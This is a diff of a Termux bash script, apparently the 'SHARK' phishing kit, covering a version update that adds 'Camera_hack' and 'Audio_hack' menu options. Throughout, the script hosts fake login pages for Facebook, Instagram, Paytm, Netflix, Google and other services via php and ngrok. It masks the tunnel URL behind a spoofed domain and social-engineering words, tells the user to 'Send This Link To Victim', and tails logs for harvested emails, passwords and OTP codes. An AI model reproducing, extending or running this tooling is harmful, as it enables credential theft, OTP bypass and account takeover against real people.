@@ -14,17 +14,30 @@
 clear
 echo ""
 echo ""
-echo -e "\e[32m============================================\e[m "
-echo -e "\e[31m    [\e[32m★\e[31m]\e[93m Instagram : bhikan_deshmukh \e[31m [\e[32m★\e[31m]\e[m "
-echo -e "\e[32m============================================\e[m " 
+banner()
+{
+  printf "`tput bold` %-40s `tput sgr0`\n" "$@"
+  echo
+  echo -e "\e[32m============================================\e[m "
+  echo -e "\e[31m    [\e[32m★\e[31m]\e[93m Instagram : bhikan_deshmukh \e[31m [\e[32m★\e[31m]\e[m "
+  echo -e "\e[32m============================================\e[m "
+}
 
-# check the internet connectivity 
+banner "
+░██████╗██╗░░██╗░█████╗░██████╗░██╗░░██╗
+██╔════╝██║░░██║██╔══██╗██╔══██╗██║░██╔╝
+╚█████╗░███████║███████║██████╔╝█████═╝░
+░╚═══██╗██╔══██║██╔══██║██╔══██╗██╔═██╗░
+██████╔╝██║░░██║██║░░██║██║░░██║██║░╚██╗
+╚═════╝░╚═╝░░╚═╝╚═╝░░╚═╝╚═╝░░╚═╝╚═╝░░╚═╝ v.2"
+echo
+# check the internet connectivity
 connection() {
 while :
 do
 if curl -s --head  --request GET www.google.com | grep "200 OK" > /dev/null ; then
     echo -e "\e[1;92m>> \e[1;93m[\e[1;92m Active ●\e[1;93m ]\e[m"
-    echo 
+    echo
     sleep 3
     break
 else
@@ -67,22 +80,22 @@ SHARK ©\e[34m
 }
 
 
-echo 
-echo 
+echo
+echo
 echo -e "\e[31m[\e[32m★\e[31m]\e[32m CONNECT TO STABLE INTERNET CONNECTION\e[m "
 sleep 2
-echo 
-echo 
+echo
+echo
 echo -en "\e[31m[\e[32m*\e[31m]\e[32m HAVE YOU CONNECTED TO IT (y/n)? \e[m "
 read ans
 if [ "$ans" != "${ans#[Yy]}" ]; then
-echo 
-echo 
+echo
+echo
 echo -e "\e[92m>>\e[96m BEST PHISHING TOOL \e[m "
 tput civis
 sleep 4
 tput cnorm
-else 
+else
 exit
 fi
 
@@ -176,45 +189,53 @@ kill -9 $ngrok
 while :
 do
 clear
-echo -e "\e[94m   
+banner()
+{
+  printf "`tput bold` %-40s `tput sgr0`\n" "$@"
+  echo
+  echo -e " \e[32m============================================\e[m "
+  echo -e " \e[31m    [\e[32m★\e[31m]\e[93m Instagram : bhikan_deshmukh \e[31m [\e[32m★\e[31m]\e[m "
+  echo -e " \e[32m============================================\e[m "
+}
 
-        ██████╗██╗  ██╗ █████╗ ██████╗ ██╗  ██╗
-       ██╔════╝██║  ██║██╔══██╗██╔══██╗██║ ██╔╝
-       ╚█████╗ ███████║███████║██████╔╝█████═╝
-        ╚═══██╗██╔══██║██╔══██║██╔══██╗██╔═██╗
-       ██████╔╝██║  ██║██║  ██║██║  ██║██║ ╚██╗
-       ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝ v 1.0\e[m "
-
-echo 
-echo -e $'\e[1;32m ======================================= \e[0m'
-echo -e $'\e[1;93m     c r e a t e d  b y  b h i k a n \e[0m '
-echo -e $'\e[1;32m ======================================= \e[0m '
-echo 
+banner "
+░██████╗██╗░░██╗░█████╗░██████╗░██╗░░██╗
+██╔════╝██║░░██║██╔══██╗██╔══██╗██║░██╔╝
+╚█████╗░███████║███████║██████╔╝█████═╝░
+░╚═══██╗██╔══██║██╔══██║██╔══██╗██╔═██╗░
+██████╔╝██║░░██║██║░░██║██║░░██║██║░╚██╗
+╚═════╝░╚═╝░░╚═╝╚═╝░░╚═╝╚═╝░░╚═╝╚═╝░░╚═╝ v.2"
+echo
 banner(){
 echo -e "\e[1;96m=============================================================\e[m "
 echo " "
-printf "\e[1;31m[\e[0m\e[1;77m01\e[0m\e[1;31m]\e[0m\e[1;32m Facebook\e[0m                \e[1;31m[\e[0m\e[1;77m17\e[0m\e[1;31m]\e[0m\e[1;32m Zomato\e[0m          \e[0m\n"                                                                                     
-printf "\e[1;31m[\e[0m\e[1;77m02\e[0m\e[1;31m]\e[0m\e[1;32m Pinterest\e[0m               \e[1;31m[\e[0m\e[1;77m18\e[0m\e[1;31m]\e[0m\e[1;32m PhonePay\e[0m        \e[0m\n"                                                                                                                    
-printf "\e[1;31m[\e[0m\e[1;77m03\e[0m\e[1;31m]\e[0m\e[1;32m Instagram\e[0m               \e[1;31m[\e[0m\e[1;77m19\e[0m\e[1;31m]\e[0m\e[1;32m Paypal\e[0m          \e[0m\n"                                                                                           
-printf "\e[1;31m[\e[0m\e[1;77m04\e[0m\e[1;31m]\e[0m\e[1;32m Uber Eats\e[0m               \e[1;31m[\e[0m\e[1;77m20\e[0m\e[1;31m]\e[0m\e[1;32m Telegram\e[0m        \e[0m\n"                                                                                         
-printf "\e[1;31m[\e[0m\e[1;77m05\e[0m\e[1;31m]\e[0m\e[1;32m OLA\e[0m                     \e[1;31m[\e[0m\e[1;77m21\e[0m\e[1;31m]\e[0m\e[1;32m Twitter\e[0m         \e[0m\n"                                                                                         
-printf "\e[1;31m[\e[0m\e[1;77m06\e[0m\e[1;31m]\e[0m\e[1;32m Google\e[0m                  \e[1;31m[\e[0m\e[1;77m22\e[0m\e[1;31m]\e[0m\e[1;32m Flipcart\e[0m        \e[0m\n"                                                                                          
-printf "\e[1;31m[\e[0m\e[1;77m07\e[0m\e[1;31m]\e[0m\e[1;32m Paytm\e[0m                   \e[1;31m[\e[0m\e[1;77m23\e[0m\e[1;31m]\e[0m\e[1;32m Wordpress\e[0m       \e[0m\n"                                                                                          
-printf "\e[1;31m[\e[0m\e[1;77m08\e[0m\e[1;31m]\e[0m\e[1;32m Netflix\e[0m                 \e[1;31m[\e[0m\e[1;77m24\e[0m\e[1;31m]\e[0m\e[1;32m Snapchat\e[0m        \e[0m\n"                                                                                         
-printf "\e[1;31m[\e[0m\e[1;77m09\e[0m\e[1;31m]\e[0m\e[1;32m Instagram-Followers\e[0m     \e[1;31m[\e[0m\e[1;77m25\e[0m\e[1;31m]\e[0m\e[1;32m Protonmail\e[0m      \e[0m\n"                                                                                         
-printf "\e[1;31m[\e[0m\e[1;77m10\e[0m\e[1;31m]\e[0m\e[1;32m Amazon\e[0m                  \e[1;31m[\e[0m\e[1;77m26\e[0m\e[1;31m]\e[0m\e[1;32m Stackoverflow\e[0m   \e[0m\n"                                                                                         
-printf "\e[1;31m[\e[0m\e[1;77m11\e[0m\e[1;31m]\e[0m\e[1;32m WhatsApp\e[0m                \e[1;31m[\e[0m\e[1;77m27\e[0m\e[1;31m]\e[0m\e[1;32m ebay\e[0m            \e[0m\n"                                                                                         
-printf "\e[1;31m[\e[0m\e[1;77m12\e[0m\e[1;31m]\e[0m\e[1;32m Linkedin\e[0m                \e[1;31m[\e[0m\e[1;77m28\e[0m\e[1;31m]\e[0m\e[1;32m Twitch\e[0m          \e[0m\n"                                                                                         
-printf "\e[1;31m[\e[0m\e[1;77m13\e[0m\e[1;31m]\e[0m\e[1;32m Hotstar\e[0m                 \e[1;31m[\e[0m\e[1;77m29\e[0m\e[1;31m]\e[0m\e[1;32m Ajio\e[0m            \e[0m\n"                                                                                         
-printf "\e[1;31m[\e[0m\e[1;77m14\e[0m\e[1;31m]\e[0m\e[1;32m Spotify\e[0m                 \e[1;31m[\e[0m\e[1;77m30\e[0m\e[1;31m]\e[0m\e[1;32m Cryptocurrency\e[0m  \e[0m\n"                                                                                         
-printf "\e[1;31m[\e[0m\e[1;77m15\e[0m\e[1;31m]\e[0m\e[1;32m Github\e[0m                  \e[1;31m[\e[0m\e[1;77m31\e[0m\e[1;31m]\e[0m\e[1;32m Mobikwik\e[0m        \e[0m\n"                                                                                         
-printf "\e[1;31m[\e[0m\e[1;77m16\e[0m\e[1;31m]\e[0m\e[1;32m IPFinder\e[0m                \e[1;31m[\e[0m\e[1;77m99\e[0m\e[1;31m]\e[0m\e[1;32m Exit\e[0m            \e[0m\n"    
+printf "\e[1;31m[\e[0m\e[1;92m01\e[0m\e[1;31m] \e[0m\e[1;37;44mFacebook\e[0m           \e[1;31m[\e[0m\e[1;92m12\e[0m\e[1;31m] \e[0m\e[1;37;104mLinkedin\e[0m          \e[1;31m[\e[0m\e[1;92m23\e[0m\e[1;31m] \e[0m\e[1;37;44mWordpress\e[0m\n"
+echo
+printf "\e[1;31m[\e[0m\e[1;92m02\e[0m\e[1;31m] \e[0m\e[1;37;41mPinterest\e[0m          \e[1;31m[\e[0m\e[1;92m13\e[0m\e[1;31m] \e[0m\e[1;37;46mHotstar\e[0m           \e[1;31m[\e[0m\e[1;92m24\e[0m\e[1;31m] \e[0m\e[1;37;43mSnapchat\e[0m\n"
+echo
+printf "\e[1;31m[\e[0m\e[1;92m03\e[0m\e[1;31m] \e[0m\e[1;48;5;200mInstagram\e[0m          \e[1;31m[\e[0m\e[1;92m14\e[0m\e[1;31m] \e[0m\e[1;37;42mSpotify\e[0m           \e[1;31m[\e[0m\e[1;92m25\e[0m\e[1;31m] \e[0m\e[1;37;40mProtonmail\e[0m\n"
+echo
+printf "\e[1;31m[\e[0m\e[1;92m04\e[0m\e[1;31m] \e[0m\e[1;37;40mUber \e[1;37;42mEats\e[0m          \e[1;31m[\e[0m\e[1;92m15\e[0m\e[1;31m] \e[0m\e[1;37;40mGithub\e[0m            \e[1;31m[\e[0m\e[1;92m26\e[0m\e[1;31m] \e[0m\e[1;38;5;209m\e[40mStackoverflow\e[0m\n"
+echo
+printf "\e[1;31m[\e[0m\e[1;92m05\e[0m\e[1;31m] \e[0m\e[1;93;40mOLA\e[0m                \e[1;31m[\e[0m\e[1;92m16\e[0m\e[1;31m] \e[0m\e[1;37;43mIPFinder\e[0m          \e[1;31m[\e[0m\e[1;92m27\e[0m\e[1;31m] \e[0m\e[1;40m\e[91mE\e[94mb\e[93ma\e[92my\e[0m\n"
+echo
+printf "\e[1;31m[\e[0m\e[1;92m06\e[0m\e[1;31m] \e[0m\e[1;40m\e[94mG\e[91mO\e[93mO\e[94mG\e[92mL\e[91mE\e[0m             \e[1;31m[\e[0m\e[1;92m17\e[0m\e[1;31m] \e[0m\e[1;37;101mZomato\e[0m            \e[1;31m[\e[0m\e[1;92m28\e[0m\e[1;31m] \e[0m\e[1;48;5;129mTwitch\e[0m\n"
+echo
+printf "\e[1;31m[\e[0m\e[1;92m07\e[0m\e[1;31m] \e[0m\e[1;107m\e[30mPay\e[106mtm\e[0m              \e[1;31m[\e[0m\e[1;92m18\e[0m\e[1;31m] \e[0m\e[1;48;5;91mPhonePay\e[0m          \e[1;31m[\e[0m\e[1;92m29\e[0m\e[1;31m] \e[0m\e[1;48;5;236mAJIO\e[0m\n"
+echo
+printf "\e[1;31m[\e[0m\e[1;92m08\e[0m\e[1;31m] \e[0m\e[1;91;107mNetflix\e[0m            \e[1;31m[\e[0m\e[1;92m19\e[0m\e[1;31m] \e[0m\e[1;107m\e[30mPay\e[106mpal\e[0m            \e[1;31m[\e[0m\e[1;92m30\e[0m\e[1;31m] \e[0m\e[1;48;5;21mMobikwik\e[0m\n"
+echo
+printf "\e[1;31m[\e[0m\e[1;92m09\e[0m\e[1;31m] \e[0m\e[1;48;5;200mInsta-Followers\e[0m    \e[1;31m[\e[0m\e[1;92m20\e[0m\e[1;31m] \e[0m\e[1;48;5;4mTelegram\e[0m          \e[1;31m[\e[0m\e[1;92m31\e[0m\e[1;31m] \e[0m\e[1;48;5;89mCamera_hack\e[m\n"
+echo
+printf "\e[1;31m[\e[0m\e[1;92m10\e[0m\e[1;31m] \e[0m\e[1;37;40mAmazon\e[0m             \e[1;31m[\e[0m\e[1;92m21\e[0m\e[1;31m] \e[0m\e[1;37;46mTwitter\e[0m           \e[1;31m[\e[0m\e[1;92m32\e[0m\e[1;31m] \e[0m\e[1;48;5;197mAudio_hack\e[m\n"
+echo
+printf "\e[1;31m[\e[0m\e[1;92m11\e[0m\e[1;31m] \e[0m\e[1;37;42mWhatsApp\e[0m           \e[1;31m[\e[0m\e[1;92m22\e[0m\e[1;31m] \e[0m\e[1;34;103mFlipcart\e[0m          \e[1;31m[\e[0m\e[1;92m99\e[0m\e[1;31m] \e[0m\e[1;91;102mExit\e[0m\n"
 echo " "
 echo -e "\e[1;96m=============================================================\e[m "
 }
 
 banner
-echo 
+echo
 ash() {
 	sleep 0.5
 	url_checker() {
@@ -225,91 +246,94 @@ ash() {
 	fi
 	fi
          }
-        echo
+  echo
 	echo -e "\e[1;96m=============================================================\e[m "
-        short=$(curl -s https://da.gd/s/?url=${link})
-        shorter=${short#https://}
-        echo
-        read -p $'\e[1;91m[\e[1;92m~\e[1;91m]\e[1;92m Mask Your url domain here [\e[1;91mEx. https://facebook.com\e[1;92m] :\e[m ' mask
-        echo
-        url_checker $mask
-        echo -e "\e[1;96m>>\e[1;93m Enter some words you like to mention in url \e[1;92m[\e[1;92mEx.free-insta-followers\e[1;92m] \e[m "
-	sleep 1
-        echo
-	echo -e "\e[1;96m>>\e[1;91m NOTE:\e[1;93m Don't use space in your words,\e[1;92m[\e[1;91minstead use \e[1;92m'-'\e[1;91m to avoid space\e[1;92m] \e[m "
-	sleep 2
-	echo
-        read -p $'\e[1;91m[\e[1;92m~\e[1;91m]\e[1;92m Enter your words here :\e[0m ' words
-        echo
-	sleep 3
-        final=$mask-$words@$shorter
-        echo -e "\e[1;91m[\e[1;92m~\e[1;91m]\e[1;92m Your phishing url >>\e[m $final "
+  echo
+  short=$(curl -s https://is.gd/create.php\?format\=simple\&url\=${phish})
+  shorter=${short#https://}
+  echo -e "Masking Domain"
+  echo
+  echo 'Example (with http or https), ex: https://google.com, http
+  ://anything.org) :'
+  echo
+  echo -en "\e[32m=>\e[0m "
+  read mask
+  url_checker $mask
+  echo -e '\nType social engineering words:(like free-money, best-pubg-tricks)'
+  echo
+  echo -e "\e[31mWARRNING : Don't Use Space\e[0m"
+  echo
+  echo -en "\e[32m=>\e[0m"
+  read words
+  echo -e "\nGenerating Link...\n"
+  final=$mask-$words@$shorter
+  echo -e "Send This Link To Victim:\e[32m ${final} "
 	echo
         }
 
         read -p $'\e[1;91m[\e[1;92m~\e[1;91m]\e[1;93m Choose Your Option : \e[0m' option
-	
+
          if [ $option = 01 ] || [ $option = 1 ]
          then
 	                    cd /data/data/com.termux/files/usr/bin/phs
                             cd facebook/
-                            echo 
+                            echo
 			    connection
 			    ( sleep 5 ) &> /dev/null & spin_shark
-			    php -S 127.0.0.1:4444 > /dev/null 2>&1 &    
-			    sleep 1  
-			    echo 
+			    php -S 127.0.0.1:4444 > /dev/null 2>&1 &
+			    sleep 1
+			    echo
 			    (sleep 6) &> /dev/null & spin
 			    echo
 			    tput civis
-			    ./ngrok http 4444 > /dev/null 2>&1 & 
+			    ./ngrok http 4444 > /dev/null 2>&1 &
 			    ( sleep 18 ) &> /dev/null & spinner
-			    echo 
+			    echo
 			    tput cnorm
-			    link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io") 
+			    link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
 			    ( sleep 6 ) &> /dev/null & spinner1
-			    ash 
+			    ash
 			    read -p $'\e[91m[\e[92m~\e[91m]\e[93m Start Phishing\e[92m(Enter) \e[93mor Close\e[92m(Ctrl+c) :\e[m ' listner
 			    clear
 			    shark_logo
-			    echo 
-			    echo -e "\e[96m===================\e[92m VICTIM INFORMATION \e[96m=================== \e[93m"  
-			    echo 
+			    echo
+			    echo -e "\e[96m===================\e[92m VICTIM INFORMATION \e[96m=================== \e[93m"
+			    echo
 			    echo -e "\e[96m===================\e[92m    SHARK © 2020    \e[96m===================\e[92m"
 			    echo
 			    tail -f log.txt | grep -e "email" -e "pass" -e "approvals_code"
-	
+
                             break;
-			     
+
 	 elif [ $option = 02 ] || [ $option = 2 ]
 	 then
 			   cd /data/data/com.termux/files/usr/bin/phs
                            cd pinterest/
-                           echo 
+                           echo
 			   connection
                            ( sleep 5 ) &> /dev/null & spin_shark
                            php -S 127.0.0.1:4444 > /dev/null 2>&1 &
                            sleep 1
-                           echo 
+                           echo
                            (sleep 6) &> /dev/null & spin
 			   echo
 			   tput civis
                            ./ngrok http 4444 > /dev/null 2>&1 &
                            ( sleep 18 ) &> /dev/null & spinner
-                           echo 
+                           echo
 			   tput cnorm
-                           link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")                      
+                           link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
 			   ( sleep 6 ) &> /dev/null & spinner1
 		           ash
 			   read -p $'\e[91m[\e[92m~\e[91m]\e[93m Start Phishing\e[92m(Enter) \e[93mor Close\e[92m(Ctrl+c) :\e[m ' listner
 			   clear
 			   shark_logo
-			   echo 
-			   echo -e "\e[96m===================\e[92m VICTIM INFORMATION \e[96m=================== \e[93m"  
-			   echo 
+			   echo
+			   echo -e "\e[96m===================\e[92m VICTIM INFORMATION \e[96m=================== \e[93m"
+			   echo
 			   echo -e "\e[96m===================\e[92m    SHARK © 2020    \e[96m=================== \e[92m"
-                           echo 
-                           tail -f log.txt | grep -e "id" -e "password"      
+                           echo
+                           tail -f log.txt | grep -e "id" -e "password"
 
                            break;
 
@@ -317,18 +341,18 @@ ash() {
 	 then
 		           cd /data/data/com.termux/files/usr/bin/phs
 			   cd instagram/
-			   echo 
+			   echo
 			   connection
 			   ( sleep 5 ) &> /dev/null & spin_shark
-			   php -S 127.0.0.1:4444 > /dev/null 2>&1 &  
+			   php -S 127.0.0.1:4444 > /dev/null 2>&1 &
 			   sleep 1
-			   echo 
+			   echo
 			   (sleep 6) &> /dev/null & spin
 			   echo
 			   tput civis
 			   ./ngrok http 4444 > /dev/null 2>&1 &
 			   ( sleep 18 ) &> /dev/null & spinner
-			   echo 
+			   echo
 			   tput cnorm
 			   link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
 			   ( sleep 6 ) &> /dev/null & spinner1
@@ -336,188 +360,188 @@ ash() {
 			   read -p $'\e[91m[\e[92m~\e[91m]\e[93m Start Phishing\e[92m(Enter) \e[93mor Close\e[92m(Ctrl+c) :\e[m ' listner
 			   clear
 			   shark_logo
-			   echo 
-			   echo -e "\e[96m===================\e[92m VICTIM INFORMATION \e[96m========================= \e[93m"  
-			   echo 
-	        	   echo -e "\e[96m===================\e[92m    SHARK © 2020    \e[96m========================= \e[92m"
+			   echo
+			   echo -e "\e[96m===================\e[92m VICTIM INFORMATION \e[96m========================= \e[93m"
+			   echo
+	       echo -e "\e[96m===================\e[92m    SHARK © 2020    \e[96m========================= \e[92m"
 			   echo
 			   tail -f log.txt
-			   
+
                            break;
-			   
+
 	elif [ $option = 04 ] || [ $option = 4 ]
         then
                           cd /data/data/com.termux/files/usr/bin/phs
 			  cd UberEats-Phishing/
-			  echo 
+			  echo
 			  connection
 			  ( sleep 5 ) &> /dev/null & spin_shark
-			  php -S 127.0.0.1:4444 > /dev/null 2>&1 & 
+			  php -S 127.0.0.1:4444 > /dev/null 2>&1 &
 			  sleep 1
-			  echo 
+			  echo
 			  (sleep 6) &> /dev/null & spin
 			  echo
 			  tput civis
 			  ./ngrok http 4444 > /dev/null 2>&1 &
 			  ( sleep 18 ) &> /dev/null & spinner
-			  echo 
+			  echo
 			  tput cnorm
-			  link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io") 
+			  link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
 			  ( sleep 6 ) &> /dev/null & spinner1
-			  ash 
+			  ash
 			  read -p $'\e[91m[\e[92m~\e[91m]\e[93m Start Phishing\e[92m(Enter) \e[93mor Close\e[92m(Ctrl+c) :\e[m ' listner
 			  clear
 			  shark_logo
-			  echo 
-			  echo -e "\e[96m========================\e[92m VICTIM INFORMATION \e[96m========================= \e[93m"  
-			  echo 
+			  echo
+			  echo -e "\e[96m========================\e[92m VICTIM INFORMATION \e[96m========================= \e[93m"
+			  echo
 			  echo -e "\e[96m========================\e[92m    SHARK © 2020    \e[96m========================= \e[92m"
 			  echo
 			  tail -f log.txt | grep -e "Email_or_Phone" -e "password" -e "verificationCode"
 
                           break;
-			  
+
         elif [ $option = 05 ] || [ $option = 5 ]
         then
                           cd /data/data/com.termux/files/usr/bin/phs
                           cd ola-otpbypass/
-                          echo 
+                          echo
 			  connection
                           ( sleep 5 ) &> /dev/null & spin_shark
 		          php -S 127.0.0.1:4444 > /dev/null 2>&1 &
-		          sleep 1   
-		          echo 
+		          sleep 1
+		          echo
 		          (sleep 6) &> /dev/null & spin
 			  echo
 			  tput civis
 		          ./ngrok http 4444 > /dev/null 2>&1 &
 		          ( sleep 18 ) &> /dev/null & spinner
-		          echo 
+		          echo
 			  tput cnorm
-		          link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")  		        
+		          link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
 			  ( sleep 6 ) &> /dev/null & spinner1
 		          ash
 			  read -p $'\e[91m[\e[92m~\e[91m]\e[93m Start Phishing\e[92m(Enter) \e[93mor Close\e[92m(Ctrl+c) :\e[m ' listner
 			  clear
 			  shark_logo
-			  echo 
-			  echo -e "\e[96m========================\e[92m VICTIM INFORMATION \e[96m========================= \e[93m"  
-			  echo 
+			  echo
+			  echo -e "\e[96m========================\e[92m VICTIM INFORMATION \e[96m========================= \e[93m"
+			  echo
 			  echo -e "\e[96m========================\e[92m    SHARK © 2020    \e[96m========================= \e[92m"
 			  echo
 		          tail -f log.txt | grep -e "number" -e "otp" -e "OTP"
 
                           break;
-			  
+
          elif [ $option = 06 ] || [ $option = 6 ]
 	 then
                           cd /data/data/com.termux/files/usr/bin/phs
                           cd google-otp/
-                          echo 
+                          echo
 			  connection
-		          ( sleep 5 ) &> /dev/null & spin_shark  
+		          ( sleep 5 ) &> /dev/null & spin_shark
 		          php -S 127.0.0.1:4444 > /dev/null 2>&1 &
 		          sleep 1
-		          echo 
-		          (sleep 6) &> /dev/null & spin 
+		          echo
+		          (sleep 6) &> /dev/null & spin
 			  echo
 			  tput civis
 		          ./ngrok http 4444 > /dev/null 2>&1 &
 		          ( sleep 18 ) &> /dev/null & spinner
-		          echo 
+		          echo
 			  tput cnorm
-		          link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")        
+		          link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
 			  ( sleep 6 ) &> /dev/null & spinner1
 		          ash
 			  read -p $'\e[91m[\e[92m~\e[91m]\e[93m Start Phishing\e[92m(Enter) \e[93mor Close\e[92m(Ctrl+c) :\e[m ' listner
 			  clear
 			  shark_logo
-			  echo 
-			  echo -e "\e[96m========================\e[92m VICTIM INFORMATION \e[96m========================= \e[93m"  
-			  echo 
+			  echo
+			  echo -e "\e[96m========================\e[92m VICTIM INFORMATION \e[96m========================= \e[93m"
+			  echo
 			  echo -e "\e[96m========================\e[92m    SHARK © 2020    \e[96m========================= \e[92m"
 			  echo
 		          tail -f log.txt | grep -e "email" -e "password" -e "OTP"
-  
+
                           break;
-			  
+
        elif [ $option = 07 ] || [ $option = 7 ]
        then
                           cd /data/data/com.termux/files/usr/bin/phs
                           cd Paytm-Phishing/
-                          echo 
-                          echo -e "\e[1;31m[\e[0m\e[1;77m 1 \e[0m\e[1;31m]\e[0m\e[1;32m Sign In \e[0m" 
+                          echo
+                          echo -e "\e[1;31m[\e[0m\e[1;77m 1 \e[0m\e[1;31m]\e[0m\e[1;32m Sign In \e[0m"
 			  echo
                           echo -e "\e[1;31m[\e[0m\e[1;77m 2 \e[0m\e[1;31m]\e[0m\e[1;32m Sign UP \e[0m"
-                          echo 
+                          echo
                           read -p $'\e[1;91m[\e[0m\e[1;92m >>> \e[0m\e[1;91m]\e[0m\e[1;92m Enter Your Choice : \e[0m' option1
 		          if [ $option1 = 1 ] || [ $option1 = 01 ]
 			  then
 			        cd paytm/
-                                echo 
+                                echo
 				connection
                                 ( sleep 5 ) &> /dev/null & spin_shark
                                 php -S 127.0.0.1:4444 > /dev/null 2>&1 &
                                 sleep 1
-                                echo 
+                                echo
                                 (sleep 6) &> /dev/null & spin
 				echo
 				tput civis
                                 ./ngrok http 4444 > /dev/null 2>&1 &
                                 ( sleep 18 ) &> /dev/null & spinner
-                                echo 
+                                echo
 				tput cnorm
-                                link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")                          
-				( sleep 6 ) &> /dev/null & spinner1
-			        ash
-				read -p $'\e[91m[\e[92m~\e[91m]\e[93m Start Phishing\e[92m(Enter) \e[93mor Close\e[92m(Ctrl+c) :\e[m ' listner
-			        clear
-				shark_logo
-			        echo 
-			        echo -e "\e[96m========================\e[92m VICTIM INFORMATION \e[96m========================= \e[93m"  
-			        echo 
-			        echo -e "\e[96m========================\e[92m    SHARK © 2020    \e[96m========================= \e[92m"
-                                echo 
-                                tail -f log.txt | grep -e "email" -e "username" -e "password" -e "otp"
-		
-	                	else
-                
-                                cd signup/
-                                echo 
-				connection
-                                ( sleep 5 ) &> /dev/null & spin_shark
-                                php -S 127.0.0.1:4444 > /dev/null 2>&1 &
-                                sleep 1
-                                echo 
-                                (sleep 6) &> /dev/null & spin
-				echo
-				tput civis
-                                ./ngrok http 4444 > /dev/null 2>&1 &
-                                ( sleep 18 ) &> /dev/null & spinner
-                                echo 
-				tput cnorm
-                                link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")                             
+                                link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
 				( sleep 6 ) &> /dev/null & spinner1
 			        ash
 				read -p $'\e[91m[\e[92m~\e[91m]\e[93m Start Phishing\e[92m(Enter) \e[93mor Close\e[92m(Ctrl+c) :\e[m ' listner
 			        clear
 				shark_logo
 			        echo
-			        echo -e "\e[96m========================\e[92m VICTIM INFORMATION \e[96m========================= \e[93m"  
-			        echo 
+			        echo -e "\e[96m========================\e[92m VICTIM INFORMATION \e[96m========================= \e[93m"
+			        echo
 			        echo -e "\e[96m========================\e[92m    SHARK © 2020    \e[96m========================= \e[92m"
-                                echo 
+                                echo
+                                tail -f log.txt | grep -e "email" -e "username" -e "password" -e "otp"
+
+	                	else
+
+                                cd signup/
+                                echo
+				connection
+                                ( sleep 5 ) &> /dev/null & spin_shark
+                                php -S 127.0.0.1:4444 > /dev/null 2>&1 &
+                                sleep 1
+                                echo
+                                (sleep 6) &> /dev/null & spin
+				echo
+				tput civis
+                                ./ngrok http 4444 > /dev/null 2>&1 &
+                                ( sleep 18 ) &> /dev/null & spinner
+                                echo
+				tput cnorm
+                                link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
+				( sleep 6 ) &> /dev/null & spinner1
+			        ash
+				read -p $'\e[91m[\e[92m~\e[91m]\e[93m Start Phishing\e[92m(Enter) \e[93mor Close\e[92m(Ctrl+c) :\e[m ' listner
+			        clear
+				shark_logo
+			        echo
+			        echo -e "\e[96m========================\e[92m VICTIM INFORMATION \e[96m========================= \e[93m"
+			        echo
+			        echo -e "\e[96m========================\e[92m    SHARK © 2020    \e[96m========================= \e[92m"
+                                echo
                                 tail -f log.txt | grep -e "email" -e "loginPassword" -e "mobileNumber" -e "otp"
 				fi
-                                
+
 				break;
-				
+
         elif [ $option = 08 ] || [ $option = 8 ]
 	then
 
                           cd /data/data/com.termux/files/usr/bin/phs
                           cd Netflix/
-                          echo 
+                          echo
 			  connection
                           ( sleep 5 ) &> /dev/null & spin_shark
                           php -S 127.0.0.1:4444 > /dev/null 2>&1 &
@@ -528,20 +552,20 @@ ash() {
 			  tput civis
                           ./ngrok http 4444 > /dev/null 2>&1 &
                           ( sleep 18 ) &> /dev/null & spinner
-                          echo 
+                          echo
 			  tput cnorm
-                          link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")                                                 
+                          link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
 			  ( sleep 6 ) &> /dev/null & spinner1
 		          ash
 			  read -p $'\e[91m[\e[92m~\e[91m]\e[93m Start Phishing\e[92m(Enter) \e[93mor Close\e[92m(Ctrl+c) :\e[m ' listner
 			  clear
 			  shark_logo
-			  echo 
-			  echo -e "\e[96m========================\e[92m VICTIM INFORMATION \e[96m========================= \e[93m"  
-			  echo 
+			  echo
+			  echo -e "\e[96m========================\e[92m VICTIM INFORMATION \e[96m========================= \e[93m"
+			  echo
 			  echo -e "\e[96m========================\e[92m    SHARK © 2020    \e[96m========================= \e[92m"
-                          echo 
-                          tail -f log.txt | grep -e "userLoginId" -e "password" -e "OTP"                 
+                          echo
+                          tail -f log.txt | grep -e "userLoginId" -e "password" -e "OTP"
 
                           break;
 
@@ -549,63 +573,63 @@ ash() {
 	   then
                            cd /data/data/com.termux/files/usr/bin/phs
                            cd instafollow/
-                           echo 
+                           echo
 			   connection
                            ( sleep 5 ) &> /dev/null & spin_shark
                            php -S 127.0.0.1:4444 > /dev/null 2>&1 &
                            sleep 1
-                           echo 
+                           echo
                            (sleep 6) &> /dev/null & spin
 			   echo
 			   tput civis
                            ./ngrok http 4444 > /dev/null 2>&1 &
                            ( sleep 18 ) &> /dev/null & spinner
-                           echo 
+                           echo
 			   tput cnorm
